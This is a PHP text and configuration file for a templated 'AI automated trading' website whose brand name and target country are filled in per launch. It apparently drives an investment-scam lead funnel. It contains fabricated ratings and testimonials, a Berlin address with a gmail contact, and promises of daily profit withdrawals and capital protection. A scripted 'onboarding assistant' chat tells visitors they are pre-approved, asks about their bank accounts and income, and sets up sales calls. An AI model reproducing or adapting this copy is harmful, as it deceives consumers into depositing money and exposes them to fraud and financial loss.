<?php
// MANUAL
$site_name = "$source";
$site_domain = "{{DOMAIN}}";
$site_url = "https://$site_domain";
$app_price = 250;
$rating_value = 4.7;
$rating_count = 1808;
$review_count = 87; // fixed (not randomized per page load) per JSON-LD requirements
$app_currency = "EUR";
$site_lang = "en-GB";
$country_name = "United Kingdom"; // default -- overwritten per-launch by generate_lang_files() via country_name= (see core/lang_pipeline.py)
$adress_name = "120 Friedrich Street, Berlin 10117, Germany";
$site_gmail = "support.finora-ai@gmail.com";
$footer_contact_address = "Address: $adress_name";
$footer_contact_email = "Email: $site_gmail";
$feedback_strong_1 = "Elias, 31, Hamburg";
$feedback_strong_2 = "Sophie, 36, Munich";
$feedback_strong_3 = "Lukas, 42, Cologne";
$feedback_strong_4 = "Miriam, 47, Stuttgart";
$page_title_main = "$source — Official Website | Automated Trading Platform";
$page_description_main = "$source — Verified automated trading platform. AI algorithms execute real-time market transactions with risk protocol protection. Start with $app_price $app_currency.";


// ==========================================
// CHAT-QUIZ TRANSLATIONS & CONFIGURATION
// ==========================================

$quiz_consultant_name = 'Lilly';
$quiz_consultant_role = 'Onboarding Assistant';

$quiz_text_welcome   = "Hello! I am $quiz_consultant_name, your onboarding assistant at $site_name. Your access is pre-approved. Please complete the setup to configure your trading profile.";
$quiz_text_q1 = "To comply with international financial regulations, please confirm your current country of residence: $country_name";
$quiz_text_a1_yes    = "Yes, this is my current residence";
$quiz_text_a1_no     = "No";

$quiz_text_q2 = "Select your age category to configure appropriate risk management parameters:";

$quiz_text_q3        = "Do you have an active bank account or credit card for daily profit withdrawals?";
$quiz_text_a3_yes    = "Yes, active account is available";
$quiz_text_a3_no     = "Not available yet";

$quiz_text_q4        = "Select your primary source of income to optimize system capital allocation:";
$quiz_text_a4_1      = "Employment / Self-employed";
$quiz_text_a4_2      = "Investment Income / Savings";
$quiz_text_a4_3      = "Other sources";

$quiz_text_q5 = "Final step: Our verification specialist will contact you by phone to confirm account setup. Representatives call between 11:00 AM and 8:00 PM. Is this time suitable?";
$quiz_text_a5_yes    = "Yes, this time is convenient";
$quiz_text_a5_no     = "Please call as soon as possible";

$quiz_text_loader    = "Processing selection and initializing secure account parameters...";
$quiz_text_final_ttl = "Account Authorized successfully! 🎉 Your workspace is configured. Complete registration below to activate trading access:";

$quiz_placeholder_fname = "First Name";
$quiz_placeholder_lname = "Last Name";
$quiz_placeholder_email = "Email Address";
$quiz_placeholder_phone = "Phone Number";
$quiz_btn_submit = "Activate Account";
$quiz_text_typing       = "is typing a message...";
$quiz_text_processing   = "Processing request...";


// ABOUT US PAGE
$page_title_about = "About Us | $source – Automated Trading Infrastructure";
$page_description_about = "Learn about $source: engineering standards, security protocols, and machine learning infrastructure driving modern automated trading.";

// TERMS & CONDITIONS PAGE
$page_title_conditions = "Terms and Conditions | $source – Legal Specifications";
$page_description_conditions = "Read the official Terms and Conditions for $source. Detailed specifications on account usage, rights, and operational protocols.";

// CONTACT PAGE
$page_title_contact = "Contact Support | $source – Technical & Account Assistance";
$page_description_contact = "Contact the $source support team for registration, account verification, and technical assistance. Fast response times guaranteed.";

// FAQ PAGE
$page_title_faq = "Frequently Asked Questions | $source – Knowledge Base";
$page_description_faq = "Detailed information on deposits, withdrawals, verification, and AI algorithmic execution on $source.";

// PRIVACY POLICY PAGE
$page_title_private = "Privacy Policy | Data Protection Specifications";
$page_description_private = "Read how $source collects, processes, and protects personal data in compliance with international privacy standards.";

// REGISTRATION PAGE
$page_title_register = "$source | Platform Access | Account Registration";
$page_description_register = "Create an account on $source to access AI-driven automated market execution. Secure registration in less than 3 minutes.";

// ---------------------------------------------------------------------------------------------------

// HEADER FOR ALL PAGES
$text_why_invest = "Why Invest?";
$text_how_to_invest = "How It Works";
$text_who_we_are = "About Us";
$text_investment_risks = "Risk Disclosure";
$text_benefits = "Benefits";
$text_faq = "FAQ";
$text_log_in = "Log In";
$text_sign_up = "Sign Up";

// ---------------------------------------------------------------------------------------------------

// FOOTER FOR ALL PAGES

$footer_logo_name = $source;
$footer_link_why_invest = "Why Invest?";
$footer_link_how_to_invest = "How It Works";
$footer_link_investment_risks = "Risk Disclosure";
$footer_link_benefits = "Benefits";
$footer_link_faq = "FAQ";
$footer_link_who_we_are = "About Us";
$footer_link_contact = "Contact";
$footer_link_privacy_policy = "Privacy Policy";
$footer_link_terms_conditions = "Terms and Conditions";
$footer_link_registration = "Registration";

$footer_contact_title = "Contact Information";
$footer_contact_address = "Address: $adress_name";
$footer_contact_email = "Email: $site_gmail";
$footer_lang_switcher_title = "Language";

$footer_description = "$source provides automated algorithmic software designed for execution across digital asset and financial markets. The system utilizes machine learning protocols to perform market analysis and order execution. Capital protection protocols and segregated data management are integrated into the architecture. All trading operations involve risk.";
$footer_copyright = "© $source 2026. All rights reserved.";

// ---------------------------------------------------------------------------------------------------

// FORMS (ALL SECTIONS)
$placeholder_fname = "First Name";
$placeholder_lname = "Last Name";
$placeholder_email = "Email Address";
$button_sign_up = "Sign Up";

// ---------------------------------------------------------------------------------------------------

// HERO SECTION
$heading_main = "$source Platform";
$text_intro = "Access automated trading with $source. The platform utilizes self-learning algorithms to execute data-driven orders across stock and cryptocurrency markets in real time. Start with a minimum deposit of $currency with zero manual chart monitoring required.";

// WHY INVEST SECTION
$heading_reasons = "Why Trading with $source Makes Sense";
$text_protect_capital = "Protect Capital Against Inflation Through Systematic Allocation";
$text_inflation = "Currency inflation reduces purchasing power over time. $source deploys automated algorithms designed to preserve real purchasing power. The system continuously evaluates price structures to maintain disciplined capital allocation without emotional bias.";
$heading_auto_investing = "Automated Execution — Zero Prior Experience Required";
$text_auto_investing = "$source manages market analysis and trade execution automatically via high-frequency data pipelines. Users do not need to read complex charts or analyze news manually. The AI engine identifies statistical patterns and executes trades according to strict risk parameters.";
$heading_min_invest = "Accessible Capital Requirement Starting at $currency";
$text_min_invest = "An initial capital balance of $currency provides full access to the AI trading core. The system is configured to optimize trade execution regardless of account size, allowing users to scale capital systematically.";
$heading_control = "Full Capital Ownership and Unrestricted Withdrawals";
$text_control = "Users retain 100% control over account funds at all times. Generated returns can be reinvested or withdrawn to personal accounts without hidden platform fees or artificial withdrawal delays.";
$button_signup = "Register Now";

// CALCULATOR SECTION
$text_expected_returns = "Calculated Performance Overview on $source";
$text_my_investment = "INITIAL DEPOSIT:";
$text_usage_period = "CALCULATION TIMEFRAME:";
$text_days = "Days";

// HOW AI INVESTING WORKS
$text_h2_ai_investments = "How AI-Powered Execution Works with $source";
$text_h3_registration = "Fast Verification – Setup Completed in Minutes";
$text_p_registration = "Upon submitting your registration, a assigned specialist will assist with verification. Account activation is processed within minutes.";
$text_h3_trading_approach = "Personalized Risk Configurations";
$text_p_trading_approach = "Configure risk parameters according to your specific financial targets. $source adjusts position sizing and stop-loss limits based on selected settings.";
$text_h3_ai_trading = "Real-Time Market Monitoring and Algorithmic Execution";
$text_p_ai_trading = "The software monitors order books and market liquidity 24/7. When quantitative entry signals are identified, trades are executed instantly with high precision.";
$text_h3_profit_flexibility = "Flexible Capital and Profit Management";
$text_p_profit_flexibility = "Maintain total flexibility over capital allocation. Choose to reinvest profits to leverage compound growth or process instant withdrawals at any time.";

// RISK MANAGEMENT
$text_h2_risk_control = "Risk Management Protocols and Asset Protection";
$text_h3_ai_analysis = "Quantitative Market Analysis Powered by Machine Learning";
$text_p_ai_analysis = "$source utilizes neural network models trained on historical tick data, order book volume, macroeconomic feeds, and technical indicators. The system calculates probability distributions for price movements in milliseconds. High-volatility market conditions trigger automated protective filters, ensuring risk-adjusted execution.";
$text_h3_custom_risk = "Tailored Risk Profiles Matched to User Objectives";
$text_p_custom_risk = "Every account can be customized to run Conservative, Balanced, or Dynamic trading strategies. The AI continuously adjusts position sizes, stop-loss ratios, and take-profit targets to ensure account activity remains within chosen risk boundaries.";
$text_h3_transparency = "Full Operation Transparency and Real-Time Dashboard";
$text_p_transparency = "Every order execution, fee structure, and account balance adjustment is logged in real time on the user dashboard. $source operates without hidden markups or spreads, providing full account visibility.";

// BENEFITS
$text_h2_benefits = "Key Advantages of Systematized Trading with $source";
$text_h3_ai_investing = "Algorithmic Precision Without Technical Overhead";
$text_p_ai_investing = "Eliminate manual chart analysis. The core engine processes thousands of data points every second, executing trades based on objective statistical models rather than emotional reactions.";
$text_h3_easy_investing = "Intuitive Platform Interface for Every User";
$text_p_easy_investing = "The platform features a clean interface engineered for operational simplicity. First-time users can complete account activation and initiate automated strategies within 10 to 15 minutes.";
$text_h3_support = "Dedicated Account Manager Support";
$text_p_support = "Every verified account is paired with an account specialist. Your manager provides technical onboarding, explains platform parameters, and assists with risk profile selection.";
$text_h3_opportunities = "Scalable Capital Growth Protocols";
$text_p_opportunities = "The automated system operates continuously across global trading sessions. Capital is managed 24/7, enabling compound balance growth through automated reinvestment options.";

// TESTIMONIALS
$feedback_h2_title = "Verified User Feedback";

$feedback_h3_1 = "From $currency Deposit to Consistent Extra Income";
$feedback_p_1 = "I started without technical trading knowledge. The system executed orders automatically, and I received my first profit withdrawal within the first week.";

$feedback_h3_2 = "Simple Setup and Effective Execution";
$feedback_p_2 = "Account setup was fast. The assigned specialist explained the risk settings clearly, allowing me to start trading without operational friction.";

$feedback_h3_3 = "Automated Capital Management";
$feedback_p_3 = "Instead of leaving capital inactive in a standard savings account, I connected to $source. The system runs continuously without requiring daily oversight.";

$feedback_h3_4 = "Operational Flexibility Anywhere";
$feedback_p_4 = "I monitor my account statistics and request profit payouts from my mobile phone while traveling. The interface works smoothly from any device.";

// PARTNERS
$partners_h2_title = "Liquidity Partners and Technology Providers";


// FAQ & CONTACT
$faq_h2_title = "Frequently Asked Questions";
$contact_h2_title = "Contact Platform Support";

$lang['faq_q1'] = 'What is the minimum initial balance required for %s?';
$lang['faq_a1'] = 'The minimum initial account allocation is %s. Users can begin with this amount to test platform features and scale their capital over time.';

$lang['faq_q2'] = 'What is the processing time for balance withdrawals on %s?';
$lang['faq_a2'] = 'Withdrawal requests are processed within 24 hours. Depending on the selected payout channel (bank transfer or digital wallet), funds arrive within 1 to 3 business days.';

$lang['faq_q3'] = 'What security measures are implemented on %s?';
$lang['faq_a3'] = '%s uses TLS 1.3 encryption, two-factor authentication (2FA), and segregated data protocols. Automated stop-loss systems protect account equity during high volatility.';

$lang['faq_q4'] = 'Is previous market trading experience required to use %s?';
$lang['faq_a4'] = 'No previous experience is required. The platform automates analysis and execution entirely while allowing optional manual risk configuration.';

// ---------------------------------------------------------------------------------------------------

// ABOUT US PAGE
$about_heading = "About Us";

$about_text_1 = "$source was established to provide systematic market execution access for both retail and institutional clients. We combine quantitative algorithms, real-time data feeds, and institutional-grade infrastructure to automate trading across equity and digital asset markets. Operational integrity, data security, and execution transparency form the core foundation of our technical operations.";

$about_text_2 = "Our engineering team consists of quantitative developers, machine learning specialists, and financial market infrastructure experts. Every component of $source—from order execution routing to automated risk filtering—undergoes strict backtesting and system auditing to ensure continuous uptime and operational stability.";

$about_image = "team.png"; // DO NOT MODIFY!!!
$about_image_alt = "Team";

$about_text_3 = "Data protection and fund security follow strict standards. $source implements TLS 1.3 transport security, AES-256 static data encryption, and complies with international standards including GDPR. User accounts are isolated using strict access control protocols.";

$about_text_4 = "Behind our software architecture is dedicated operational support. Every registered user is assigned a specialist to guide them through platform parameters, verify account details, and assist with risk management setup.";

$about_text_5 = "We continuous refine our algorithmic trading models using live order book data and machine learning feedback loops. System enhancements are validated through empirical data prior to platform deployment. We do not offer speculative promises; we deliver robust technical infrastructure.";

$about_text_6 = "Thousands of users utilize $source to automate their financial market exposure. By removing emotional trading bias and simplifying execution, $source provides a streamlined entry point into modern quantitative investing.";

$about_text_7 = "$source represents an integrated quantitative ecosystem built on security, efficiency, and automated precision. We provide the tools required to trade global markets with structured capital protection protocols.";


// ---------------------------------------------------------------------------------------------------
// TERMS & CONDITIONS
$terms_heading = "Terms and Conditions";

$terms_text_1 = "This document defines the Terms and Conditions governing access to and usage of the $source platform. By creating an account or accessing platform services, you agree to comply with these terms. Read this document thoroughly before proceeding.";

$terms_text_2 = "Access to $source is restricted to individuals who are at least 18 years old and possess full legal capacity. Accounts established by minors or unauthorized third parties will be terminated immediately.";

$terms_text_3 = "Platform access may be subject to temporary maintenance, software updates, or network latency caused by extreme market conditions. $source reserves the right to modify or update platform modules, execution algorithms, and interface specifications to maintain infrastructure security.";

$terms_text_4 = "All proprietary software, trade algorithms, site design, text assets, and trademarks belong exclusively to $source. Unauthorized copying, reverse engineering, or redistribution of platform components is strictly prohibited.";

$terms_text_5 = "Users are required to provide accurate registration data. Providing false verification details may lead to temporary account suspension or termination in compliance with Anti-Money Laundering (AML) standards.";

$terms_text_6 = "Trading financial instruments involves market risk. $source provides technical software for automated order execution; it does not operate as a licensed financial advisory firm. Users accept full financial responsibility for capital allocated to automated strategies.";

$terms_text_7 = "We reserve the right to amend these Terms to reflect regulatory updates or technical modifications. Registered users will be notified of material changes prior to their implementation date.";

$terms_text_8 = "Security protocols, including segregated data processing and encrypted connection layers, are active across all system operational endpoints to protect account integrity.";

// ---------------------------------------------------------------------------------------------------

// CONTACT PAGE
$contact_heading = "Contact Us";

$contact_intro = "Our operational support team is available to assist with account setup, technical inquiries, and system parameter configurations.";

$contact_how_to = "Support Channels";

$contact_how_to_text = "Support requests are handled in order of submission during business operating hours (CET). Common assistance categories include:";

$contact_list_1 = "Account creation, identity verification, and risk profile customization";
$contact_list_2 = "Technical support regarding platform performance and dashboard access";
$contact_list_3 = "Inquiries regarding deposit processing and withdrawal timeframes";
$contact_list_4 = "Information regarding AI quantitative models and execution parameters";
$contact_list_5 = "Platform feedback and feature request submissions";
$contact_list_6 = "General customer service and onboarding inquiries";

$contact_send_message = "Submit Inquiry";

$contact_send_message_text = "Complete the contact form below to open a support ticket. Inquiries submitted on business days are reviewed within 24 hours.";

$contact_info = "Contact Information";

$contact_info_text = "We prioritize fast communication and transparent technical support. Reach out to our team via form submission, direct email, or phone support.";

// ---------------------------------------------------------------------------------------------------

// FAQ PAGE
$faq_page_heading = "Frequently Asked Questions";
$faq_page_subheading = "Knowledge Base & Platform Guidance";
$faq_page_intro_1 = "Find answers to key questions regarding system setup, account security, and profit withdrawals.";
$faq_page_intro_2 = "Review this guide to understand how $source operates and how to configure your account.";
$faq_page_intro_3 = "For direct assistance, contact our 24/7 technical support team.";
$faq_page_section_heading = "FAQ – Platform Operations & Security";


// ---------------------------------------------------------------------------------------------------
// PRIVACY POLICY
$private_policy_heading = "Privacy Policy";

$private_policy_intro = "At $source, data protection is managed under strict compliance standards. This Privacy Policy details how user information is collected, stored, processed, and secured.";

$private_policy_section_1_heading = "1. Data Controller";
$private_policy_section_1_text = "The operator of $source acts as the primary data controller for personal information collected through this application.";

$private_policy_section_2_heading = "2. Data Categories Collected";
$private_policy_section_2_text = "We collect information strictly necessary to provide trading functionality and fulfill compliance obligations:";
$private_policy_section_2_list = [
"Identity Data: First name, last name, and date of birth for KYC verification.",
"Contact Details: Email address, telephone number, and country of residence.",
"Financial Logs: Transaction history, deposit records, and withdrawal endpoints.",
"System Telemetry: IP addresses, browser types, session tokens, and connection logs.",
"Compliance Verification Documents: Government identity records and address verification proofs."
];
$private_policy_section_2_note = "We do not process special categories of sensitive personal data without explicit legal authorization.";

$private_policy_section_3_heading = "3. Methods of Data Collection";
$private_policy_section_3_text = "Data is collected via encrypted input channels:";
$private_policy_section_3_list = [
"Directly submitted user information during registration and document upload.",
"Automated telemetry recorded via system cookies and platform server logs.",
"Verification status logs provided by regulated third-party compliance services."
];

$private_policy_section_4_heading = "4. Operational Purpose of Data Processing";
$private_policy_section_4_text = "User data is processed strictly for the following operational needs:";
$private_policy_section_4_list = [
"Provision and maintenance of trading account access.",
"Processing of deposit and withdrawal execution requests.",
"Account verification and fulfillment of AML/KYC requirements.",
"System security monitoring and threat prevention.",
"Platform performance optimization and technical troubleshooting."
];

$private_policy_section_5_heading = "5. Legal Basis for Processing";
$private_policy_section_5_list = [
"Execution of user service contracts.",
"Fulfillment of legal and financial regulatory requirements.",
"Legitimate interest in maintaining network cybersecurity.",
"Explicit consent granted by the user during onboarding."
];

$private_policy_section_6_heading = "6. Third-Party Data Disclosures";
$private_policy_section_6_text = "Data is shared exclusively with authorized technology and payment partners:";
$private_policy_section_6_list = [
"Payment processors and banking infrastructure providers.",
"Automated identity verification service operators.",
"Cloud hosting and cybersecurity service providers operating under strict data processing agreements.",
"Regulatory authorities when legally mandated by court orders."
];
$private_policy_section_6_note = "We do not monetize, rent, or sell personal user data to commercial third parties.";

$private_policy_section_7_heading = "7. Cross-Border Data Transfers";
$private_policy_section_7_text = "Data processed outside your jurisdiction is secured through Standard Contractual Clauses (SCCs) to maintain regulatory compliance.";

$private_policy_section_8_heading = "8. System Security Standards";
$private_policy_section_8_text = "We maintain institutional security parameters to safeguard user assets and data:";
$private_policy_section_8_list = [
"TLS 1.3 network transport encryption.",
"AES-256 data encryption for static database storage.",
"Regular system penetration testing and vulnerability assessments.",
"Multi-factor authentication (MFA) account protection.",
"Isolated database environments preventing unauthorized access."
];
$private_policy_section_8_note = "Continuous security monitoring is maintained across all system endpoints.";

$private_policy_section_9_heading = "9. Retention Schedule";
$private_policy_section_9_text = "Personal information is retained only as long as necessary to support active accounts or fulfill statutory record-keeping obligations under financial regulations.";

$private_policy_section_10_heading = "10. Statutory User Rights";
$private_policy_section_10_text = "Under international privacy standards, users possess the following rights:";
$private_policy_section_10_list = [
"Right to inspect personal data stored in platform databases.",
"Right to request correction of incomplete or outdated data.",
"Right to request data erasure subject to regulatory retention mandates.",
"Right to request data portability in structured formats.",
"Right to revoke data processing consent at any time."
];

$private_policy_section_11_heading = "11. Cookies and Analytics";
$private_policy_section_11_text = "System cookies are used to maintain active authentication sessions and analyze platform telemetry. Users can manage cookie preferences through browser settings.";
$private_policy_google_choices = 'You can manage how Google uses information from your visits through <a href="http://www.google.com/settings/ads" target="_blank" rel="noopener">Google Ads Settings</a>, opt out of interest-based advertising using the <a href="https://tools.google.com/dlpage/gaoptout" target="_blank" rel="noopener">Google Analytics Opt-out Browser Add-on</a>, or review <a href="https://www.google.com/intl/en/policies/privacy/" target="_blank" rel="noopener">Google\'s Privacy Policy</a> for more details.';

$private_policy_section_12_heading = "12. Policy Updates";
$private_policy_section_12_text = "Revisions to this Privacy Policy will be posted to this page with an updated modification date.";

$private_policy_section_13_heading = "13. Privacy Support Contact";
$private_policy_section_13_text = "For inquiries regarding data protection protocols, contact our compliance officer at $site_gmail.";

$private_policy_agreement = "By accessing $source, you acknowledge and accept the processing terms defined in this Privacy Policy.";

$private_policy_thank_you = "Thank you for reviewing our security standards.";

// ---------------------------------------------------------------------------------------------------

// REGISTRATION
$register_heading = "Create Your Account on $source and Activate Automated Execution";

// ==========================================
// RISK WARNING PAGE
// ==========================================
$page_title_risk_warning = "Risk Disclosure | $source";
$page_description_risk_warning = "Important risk disclosure regarding automated trading, market volatility, and digital asset execution on $source.";
$risk_warning_heading = "Risk Disclosure Statement";
$risk_warning_intro = "Understanding risk exposure is essential prior to trading financial instruments.";

$risk_warning_ai_heading = "System Risk Mitigation Features:";
$risk_warning_ai_list = [
    "<strong>Quantitative Execution:</strong> Algorithmic logic executes trade rules based on objective price triggers.",
    "<strong>Data-Driven Logic:</strong> System decisions rely on statistical probability models.",
    "<strong>Custom Control Settings:</strong> Users adjust maximum position sizes and loss thresholds directly on the dashboard.",
];

$risk_warning_disclaimer = "<strong>Disclaimer:</strong> Financial trading involves risk of capital loss. Automated software does not eliminate market risk. Past performance statistics are not indicative of future market execution. This site does not provide licensed financial advisory services.";

$risk_warning_s1_heading = "1. Financial and Asset Volatility Risks";
$risk_warning_s1_intro = "Equities and digital assets experience rapid market price fluctuations.";
$risk_warning_s1_list = [
    "Asset valuations can change rapidly, leading to potential loss of deposited capital.",
    "Macroeconomic news, regulatory changes, and liquidity fluctuations directly impact market spreads.",
    "Users should trade exclusively with disposable capital allocated for risk assets.",
];

$risk_warning_s2_heading = "2. Order Execution and Liquidity Risks";
$risk_warning_s2_list = [
    "<strong>Market Liquidity:</strong> High-volatility events may cause order execution slippage or latency.",
    "<strong>Leverage Risk:</strong> Leveraged execution amplifies both gains and losses. Capital loss can occur rapidly when trading leveraged products.",
];

$risk_warning_s3_heading = "3. Technical Infrastructure Risks";
$risk_warning_s3_list = [
    "<strong>System Latency:</strong> Internet connection instability or server load spikes may impact order execution speed.",
    "<strong>Cybersecurity:</strong> Users must maintain strong passwords and account credentials to prevent unauthorized access.",
];

$risk_warning_s4_heading = "4. Legal & Regulatory Compliance";
$risk_warning_s4_list = [
    "<strong>Regulatory Status:</strong> Financial regulations vary across jurisdictions. Users are responsible for confirming local compliance requirements.",
    "<strong>Tax Liabilities:</strong> Tax obligations arising from trading profits are the sole responsibility of the account holder.",
];

$risk_warning_contact = "<strong>Contact Support:</strong> Direct questions regarding risk disclosures to our support team using the official contact form.";
$footer_link_risk_warning = "Risk Warning";
?>
